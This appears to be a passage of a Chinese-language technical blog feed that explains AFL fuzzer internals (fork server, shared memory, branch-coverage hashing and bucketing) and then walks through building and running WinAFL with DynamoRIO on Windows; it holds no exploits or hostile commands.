&#125;</span><br><span class="line">__afl_fork_resume:</span><br><span class="line">      close(<span class="number">198</span>);</span><br><span class="line">      close(<span class="number">199</span>);</span><br><span class="line">      v19 = v28;</span><br><span class="line">      v18 = v29;</span><br><span class="line">      a2 = v30;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v20 = _afl_prev_loc ^ a2;</span><br><span class="line">  _afl_prev_loc ^= v20;</span><br><span class="line">  _afl_prev_loc = (<span class="keyword">unsigned</span> __int64)_afl_prev_loc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  ++*(_BYTE *)(v19 + v20);</span><br><span class="line">  <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读伪代码或者汇编，可以总结其工作流程如下：</p><ol><li><p>先判断是否设置了共享内存，如果没设置则判断<code>_afl_setup_failure</code>是否为真，如果为真，则代表setup失败，直接返回。也就是说只有第一次执行<code>__afl_maybe_log()</code>的时候，才会进入该 if 语句。</p><ul><li>如果初始化失败则直接返回</li><li>初始化成功后，读取<code>_afl_global_area_ptr</code>的值，不为 0 ，则赋值给 <code>_afl_area_ptr</code></li><li><code>_afl_global_area_ptr</code>为 0， 则把共享内存连接到当前进程的地址空间，将得到的地址，保存到<code>_afl_area_ptr</code>和<code>_afl_global_area_ptr</code>中。</li><li><code>write(199, &amp;_afl_temp, 4uLL) == 4</code>写4个字节到状态管道<code>st_pipe[0]</code>，forkserver 告诉 fuzzer 自己准备好了，而这正好是<code>rlen = read(fsrv_st_fd, &amp;status, 4);</code>中等待的信息。<ul><li><code>read(198, &amp;_afl_temp, 4uLL) != 4</code>forkserver 再从管道中读取 4 个字节，这时候表示 fuzzer 也准备好了。这时候 fork 出一个新的子进程，用来跑 target，而原本的父进程则用来通信。</li><li><code>write(199, &amp;_afl_fork_pid, 4uLL);</code>将子进程的 pid 写进管道，以为<code>fuzzer</code>的监控。</li><li>然后父进程即fork server等待子进程结束，并保存其执行结果到<code>_afl_temp</code>中，然后将子进程的执行结果，从<code>_afl_temp</code>写入到状态管道，告知fuzz。</li><li>父进程不断执行<code>__afl_fork_wait_loop</code>循环，不断从控制管道读取，直到fuzz端命令fork server进行新一轮测试。</li></ul></li></ul></li><li><p>如果共享内存已经被设置，则直接进入<code>__afl_store</code>逻辑，看伪代码可以知道：就是将上一个桩点的值(prev_location)和当前桩点的值(<code>R(MAP_SIZE)</code>)异或，取值后，使得<strong>共享内存里对应的槽</strong>的值加一，然后将prev_location设置为<code>cur_location &gt;&gt; 1;</code>。其余内容我们在下文分析。</p></li></ol><p>在fork server执行完毕后，当我们运行<code>target</code>的时候，fuzzer会调用<code>run_target()</code>，在此方法中，便是通过命令管道，通知fork server准备fork；并通过状态管道，获取子进程pid：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line">s32 res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In non-dumb mode, we have the fork server up and running, so simply tell it to have at it, and then read back PID. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;child_pid, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;status, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">/*fuzzer再次读取状态管道，获取子进程退出状态，并由此来判断子进程结束的原因，例如正常退出、超时、崩溃等，并进行相应的记录。. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123;</span><br><span class="line"></span><br><span class="line">    kill_signal = WTERMSIG(status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_timed_out &amp;&amp; kill_signal == SIGKILL) <span class="keyword">return</span> FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FAULT_CRASH;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>简介来说整个 server 流程如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210413092653.png" alt="image-20210413092646310"></p><blockquote><p>afl 在初始化 forkserver 的时候会创建两个管道，fork 后通过 execve 去执行 target，因为目标程序的 main 函数已经被插桩，程序的控制流会交到_afl_maybe_log手中。如果 fuzz 实例是第一次运行，则此子进程则会充当 fuzz server，之后的程序都是由该 server fork出来的子进程。fuzz进行的时候，fuzz server会一直fork子进程，并且将子进程的结束状态通过pipe传递给afl-fuzz。</p></blockquote><h1 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h1><p>我们知道AFL 是以无限 fork 的形式进行 fuzzing 的，那么可以了解到 fuzzer 和 target 直接信息是要共享的，比如：执行过程中的分支信息；随后，fuzzer便可以根据这些信息，判断这次执行的整体流程和代码覆盖情况。</p><p>AFL使用共享内存，来完成以上信息在fuzzer和target之间的传递。具体地，fuzzer在启动时，会执行<code>setup_shm()</code>方法进行配置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">setup_shm</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* shm_str;</span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">    </span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atexit(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = alloc_printf(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  ck_free(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!trace_bits) PFATAL(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>shmget()：用来创建共享内存</p><p>shmat() ：第一次创建完共享内存时，它还不能被任何进程访问，shmat()函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间</p></blockquote><ul><li><p>首先调用<code>shemget()</code>分配一块共享内存，大小<code>MAP_SIZE</code>为64K</p></li><li><p>分配成功后，该共享内存的标志符会通过<code>setenv</code>设置到环境变量中，从而之后<code>fork()</code>得到的子进程可以通过该环境变量，得到这块共享内存的标志符</p></li><li><p>fuzzer 则会通过 <code>trace_bits</code> 来保存共享内存的地址</p></li><li><p>每次 fuzzer 去运行 target 的时候都会初始化共享内存</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> u8 <span class="title">run_target</span><span class="params">(<span class="keyword">char</span>** argv, u32 timeout)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">memset</span>(trace_bits, <span class="number">0</span>, MAP_SIZE);</span><br><span class="line">  MEM_BARRIER();</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>而在 forkserver 内部</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char __usercall _afl_maybe_log@&lt;al&gt;(char a1@&lt;of&gt;, __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;xmm0&gt;, __int64 a4@&lt;xmm1&gt;, __int64 a5@&lt;xmm2&gt;, __int64 a6@&lt;xmm3&gt;, __int64 a7@&lt;xmm4&gt;, __int64 a8@&lt;xmm5&gt;, __int64 a9@&lt;xmm6&gt;, __int64 a10@&lt;xmm7&gt;, __int64 a11@&lt;xmm8&gt;, __int64 a12@&lt;xmm9&gt;, __int64 a13@&lt;xmm10&gt;, __int64 a14@&lt;xmm11&gt;, __int64 a15@&lt;xmm12&gt;, __int64 a16@&lt;xmm13&gt;, __int64 a17@&lt;xmm14&gt;, __int64 a18@&lt;xmm15&gt;)</span><br><span class="line">&#123;</span><br><span class="line">      ...</span><br><span class="line">      v22 &#x3D; getenv(&quot;__AFL_SHM_ID&quot;);</span><br><span class="line">      if ( !v22 || (v23 &#x3D; atoi(v22), v24 &#x3D; shmat(v23, 0LL, 0), v24 &#x3D;&#x3D; (void *)-1LL) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++_afl_setup_failure;</span><br><span class="line">        v18 &#x3D; v29;</span><br><span class="line">        return v18 + 127;</span><br><span class="line">      &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  则会先判断共享内存是否被设置，然后通过调用<code>shmat()</code>，target将这块共享内存也映射到了自己的内存空间中，并将其地址保存在<code>__afl_area_ptr</code>及<code>edx</code>中。由此，便完成了fuzzer与target之间共享内存的设置。</p></li></ul><h1 id="分支信息的记录"><a href="#分支信息的记录" class="headerlink" title="分支信息的记录"></a>分支信息的记录</h1><p>由官网文档可知，AFL 是根据二元 tuple (跳转的源地址和目标地址)来记录分支信息，从而获取 target 的执行流程和代码覆盖情况，其伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400</span>CB0 __afl_store:                            ; CODE XREF: __afl_maybe_log+<span class="number">4F</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400</span>CB0                                         ; __afl_maybe_log+<span class="number">309</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400</span>CB0                 <span class="keyword">xor</span>     rcx, cs:__afl_prev_loc</span><br><span class="line">.text:<span class="number">0000000000400</span>CB7                 <span class="keyword">xor</span>     cs:__afl_prev_loc, rcx</span><br><span class="line">.text:<span class="number">0000000000400</span>CBE                 shr     cs:__afl_prev_loc, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400</span>CC5                 inc     byte ptr [rdx+rcx]</span><br><span class="line">    </span><br><span class="line">v20 = _afl_prev_loc ^ a2;</span><br><span class="line">_afl_prev_loc ^= v20;</span><br><span class="line"> _afl_prev_loc = (<span class="keyword">unsigned</span> __int64)_afl_prev_loc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">++*(_BYTE *)(v19 + v20);</span><br></pre></td></tr></table></figure><p>其中 a2 保存的寄存器 rcx 的值，跟踪可以发现，rcx 存贮的是随机数，那么简单来说上述流程就是：就是将上一个桩点的值(prev_location)和当前桩点的值(<code>R(MAP_SIZE)</code>)异或，取值后，使得<strong>共享内存里对应的槽</strong>的值加一，然后将<code>cur_location</code> 的值右移一位然后得到新的<code>prev_location</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>因为，AFL在为每个代码块插桩的时候都会生成一个随机数，作为其”位置”的记录，然后对分支处的”源位置”和”目标位置”进行异或，讲其结果作为该分支的 key，并保存每个分支的执行次数。</p><p>用于保存执行次数的实际上是一个哈希表，大小为<code>MAP_SIZE=64K</code>，当然会存在碰撞的问题；但根据AFL文档中的介绍，对于不是很复杂的目标，碰撞概率还是可以接受的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> Branch cnt | Colliding tuples | Example targets</span><br><span class="line">------------+------------------+-----------------</span><br><span class="line">      1,000 | 0.75%            | giflib, lzo</span><br><span class="line">      2,000 | 1.5%             | zlib, tar, xz</span><br><span class="line">      5,000 | 3.5%             | libpng, libwebp</span><br><span class="line">     10,000 | 7%               | libxml</span><br><span class="line">     20,000 | 14%              | sqlite</span><br><span class="line">     50,000 | 30%              | -</span><br></pre></td></tr></table></figure><p>如果一个目标过于复杂，那么AFL状态面板中的map_density信息就会有相应的提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│    map density : 3.61% &#x2F; 14.13%        │</span><br><span class="line">│ count coverage : 6.35 bits&#x2F;tuple       │</span><br><span class="line">┼─ findings in depth ────────────────────┤</span><br></pre></td></tr></table></figure><p>这里的map density，就是这张哈希表的密度。可以看到，上面示例中，该次执行的哈希表密度仅为3.61%，即整个哈希表差不多有95%的地方还是空的，所以碰撞的概率很小。不过，如果目标很复杂，map density很大，那么就需要考虑到碰撞的影响了。</p><p>另外，AFL需要将<code>cur_location</code>右移1位后，再保存到<code>prev_location</code>中。官方文档中解释了这样做的原因。假设target中存在<code>A-&gt;A</code>和<code>B-&gt;B</code>这样两个跳转，如果不右移，那么这两个分支对应的异或后的key都是0，从而无法区分；另一个例子是<code>A-&gt;B</code>和<code>B-&gt;A</code>，如果不右移，这两个分支对应的异或后的key也是相同的。</p><p>由上述分析可知，之前提到的共享内存，被用于保存一张哈希表，target在这张表中记录每个分支的执行数量。随后，当target执行结束后，fuzzer便开始对这张表进行分析，从而判断代码的执行情况。</p><h1 id="分支信息的分析"><a href="#分支信息的分析" class="headerlink" title="分支信息的分析"></a>分支信息的分析</h1><p>首先，fuzzer通过调用 <code>classify_counts</code> 对<code>trace_bits</code>（共享内存）进行预处理</p><p>具体地，target 是将每个分支的执行次数用 1 个 byte 来储存，而 fuzzer 则进一步把这个执行次数归入以下的 buckets 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>, </span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>, </span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>, </span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>, </span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>, </span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>举个例子，如果某分支执行了 1 次，那么落入第 2 个 bucket，其计数 byte 仍为 1；如果某分支执行了 4 次，那么落入第 5 个 bucket，其计数 byte 将变为 8，等等。（执行了 4-7 次的其计数为 8）</p><p>这样处理之后，对分支执行次数就会有一个简单的归类。例如，如果对某个测试用例处理时，分支A执行了32次；对另外一个测试用例，分支A执行了33次，那么AFL就会认为这两次的代码覆盖是相同的。当然，这样的简单分类肯定不能区分所有的情况，不过在某种程度上，处理了一些因为循环次数的微小区别，而误判为不同执行结果的情况。</p><p>随后，对于某些mutated input来说，如果这次执行没有出现崩溃等异常输出，fuzzer还会检查其是否新增了执行路径。具体来说，是对<code>trace_bits</code>计算hash并来实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u32 cksum &#x3D; hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br></pre></td></tr></table></figure><p>通过比较hash值，就可以判断<code>trace_bits</code>是否发生了变化，从而判断此次mutated input是否带来了新路径，为之后的fuzzing提供参考信息。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html">https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</a></p><p><a href="https://www.cnblogs.com/52php/p/5861372.html">https://www.cnblogs.com/52php/p/5861372.html</a></p><p><a href="http://rk700.github.io/2017/12/28/afl-internals/">http://rk700.github.io/2017/12/28/afl-internals/</a></p><p><a href="https://xz.aliyun.com/t/4628#toc-10">https://xz.aliyun.com/t/4628#toc-10</a></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0MzgzNTU0Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=9d0ff5e0bae65f9ca9dbea4cf74449c6&amp;chksm=fb04159acc739c8c36e0785e2ce9c3a202066c6cc39a9ce32fd0fc9dfeb348e860a82e29c9d6&amp;scene=178&amp;cur_album_id=1363100069033066496#rd">https://mp.weixin.qq.com/s?__biz=MzU0MzgzNTU0Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=9d0ff5e0bae65f9ca9dbea4cf74449c6&amp;chksm=fb04159acc739c8c36e0785e2ce9c3a202066c6cc39a9ce32fd0fc9dfeb348e860a82e29c9d6&amp;scene=178&amp;cur_album_id=1363100069033066496#rd</a></p><p><a href="https://paper.seebug.org/842/#1-code-coverage">https://paper.seebug.org/842/#1-code-coverage</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Build Winafl | HonggFuzz | AFL</title>
      <link href="posts/32c104a1/"/>
      <url>posts/32c104a1/</url>
      
        <content type="html"><![CDATA[<h1 id="Winafl-Build"><a href="#Winafl-Build" class="headerlink" title="Winafl Build"></a>Winafl Build</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>版本：    Windows 10 专业版</p><p>版本号：    20H2</p><h2 id="Winafl-搭建"><a href="#Winafl-搭建" class="headerlink" title="Winafl 搭建"></a>Winafl 搭建</h2><h3 id="Installing-Visual-Studio-2017-Installing-Visual-Studio-2019"><a href="#Installing-Visual-Studio-2017-Installing-Visual-Studio-2019" class="headerlink" title="Installing Visual Studio 2017 / Installing Visual Studio 2019"></a>Installing Visual Studio 2017 / Installing Visual Studio 2019</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://x9security.com/wp-content/uploads/2020/09/Installing_vs2017.png"></p><h3 id="Installing-git-amp-cmake-amp-python2"><a href="#Installing-git-amp-cmake-amp-python2" class="headerlink" title="Installing git &amp; cmake &amp; python2"></a>Installing git &amp; cmake &amp; python2</h3><h3 id="Installing-DynamoRIO-amp-WinAFL"><a href="#Installing-DynamoRIO-amp-WinAFL" class="headerlink" title="Installing DynamoRIO &amp; WinAFL"></a>Installing DynamoRIO &amp; WinAFL</h3><p>下载 <a href="https://github.com/googleprojectzero/winafl">WINAFL</a>：<a href="https://github.com/googleprojectzero/winafl">https://github.com/googleprojectzero/winafl</a></p><p>下载<a href="https://github.com/DynamoRIO/dynamorio/releases">DynamoRIO</a>：<a href="https://github.com/DynamoRIO/dynamorio/releases">https://github.com/DynamoRIO/dynamorio/releases</a></p><p>下载后把二者解压到同一文件夹下，如 <code>myafl</code>，手动编译 <code>x64</code>环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\air\Desktop&gt;cd myafl</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl&gt;cd winafl</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl&gt;mkdir build64</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl&gt;cd build64</span><br><span class="line">if VS2019</span><br><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=C:\Users\air\Desktop\myafl\DynamoRIO\cmake</span><br><span class="line">cmake --build . --config Release</span><br><span class="line"></span><br><span class="line">if VS2017</span><br><span class="line">cmake -G&quot;Visual Studio 15 2017&quot; -A x64 .. -DDynamoRIO_DIR=C:\Users\air\Desktop\myafl\DynamoRIO\cmake </span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h3 id="DynamoRIO"><a href="#DynamoRIO" class="headerlink" title="DynamoRIO"></a>DynamoRIO</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 1. 后面跟 &lt;客户端&gt; &lt;客户端 参数&gt; —(分割线) &lt;目标程序 和 目标程序参数&gt;</span><br><span class="line">-c &lt;client&gt; [client options] — &lt;app and args to run&gt;</span><br><span class="line">&#x2F;&#x2F; 2.1 winafl.dll 参数说明。这也是插桩参数的使用[instrumentation options]</span><br><span class="line">-debug # debug模式, 它会生成一个log文件</span><br><span class="line">-target_module # 目标程序(只能有一个), 也是target_offset所在的模块</span><br><span class="line">-target_offset # 目标程序偏移，相对于target_module的偏移，在method无法导出的时候使用</span><br><span class="line">-fuzz_iterations # 目标程序重新启动一次内运行目标函数(即target_method)的最大迭代数</span><br><span class="line">-nargs # 目标程序执行所需要的参数个数(包括目标程序本身)</span><br><span class="line">-target_module # 目标函数,需要export或者调试符号(pdb)</span><br><span class="line">-coverage_module # 计算覆盖率的模块,也就是目标程序会调用的模块(dll); (可以有多个)</span><br></pre></td></tr></table></figure><h3 id="WinAFL"><a href="#WinAFL" class="headerlink" title="WinAFL"></a>WinAFL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-i dir        - input directory with test cases</span><br><span class="line">-o dir        - output directory for fuzzer findings</span><br><span class="line">-t msec       - timeout for each run</span><br><span class="line">-D dir        - directory containing DynamoRIO binaries (drrun, drconfig)</span><br><span class="line">-P            - use Intel PT tracing mode</span><br><span class="line">-Y            - enable the static instrumentation mode</span><br><span class="line">-f file       - location read by the fuzzed program</span><br><span class="line">-m limit      - memory limit for the target process</span><br><span class="line">-p            - persist DynamoRIO cache across target process restarts</span><br><span class="line">-c cpu        - the CPU to run the fuzzed program</span><br><span class="line">-d            - quick &amp; dirty mode (skips deterministic steps)</span><br><span class="line">-n            - fuzz without instrumentation (dumb mode)</span><br><span class="line">-x dir        - optional fuzzer dictionary</span><br><span class="line">-I msec       - timeout for process initialization and first run</span><br><span class="line">-T text       - text banner to show on the screen</span><br><span class="line">-M \\ -S id   - distributed mode</span><br><span class="line">-C            - crash exploration mode (the peruvian rabbit thing)</span><br><span class="line">-l path       - a path to user-defined DLL for custom test cases processing</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python winafl-cmin.py -D C:\Users\air\Desktop\myafl\DynamoRIO\bin64 -t 20000 -i C:\Users\air\Desktop\myafl\winafl\build64\bin\Release\tiff -o </span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl\build64\bin\Release\in -covtype edge -coverage_module xxx.dll -target_module xxx.exe -target_offset xxx -nargs 2 -- xxx.exe @@</span><br><span class="line"></span><br><span class="line">.\afl-fuzz.exe -i in -o out -D C:\Users\air\Desktop\myafl\DynamoRIO\bin64 -t 20000 -- -target_module xxx.exe -coverage_module xxx.dll -target_offset xxx -nargs 2 -- xxx.exe @@</span><br><span class="line"></span><br><span class="line">drrun.exe -c winafl.dll -debug -target_module test_gdiplus.exe -target_offset 0x10D0 -fuzz_iterations 10 -nargs 2 -- test_gdiplus.exe input.bmp</span><br><span class="line"></span><br><span class="line">for i in *; do afl-tmin -i $i -o tmin-$i -- ~&#x2F;path&#x2F;to&#x2F;tested&#x2F;program [params] @@; done; </span><br></pre></td></tr></table></figure></blockquote><h2 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h2><h3 id="cmin"><a href="#cmin" class="headerlink" title="cmin"></a>cmin</h3><p>[-] PROGRAM ABORT : Unexpected result from pipe! expected ‘P’, instead received ‘C’</p><p>put <code>winafl-cmin.py</code> <code>winafl.dll</code> and other winafl program in the same directory as your test program.</p><p>test <code>winafl-cmin.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python winafl-cmin.py -D D:\Dropbox\fuzzing\DynamoRIO\bin64 -t 20000 -i  D:\Dropbox\fuzzing\test\input  -o D:\Dropbox\fuzzing\test\minset -covtype edge -coverage_module user32.dll -target_module TestLoadSimple.exe -target_offset 0x11910 -nargs 2 -v -- TestLoadSimple.exe @@</span><br></pre></td></tr></table></figure><p>test <code>afl-fuzz.exe</code></p><figure class="highlight 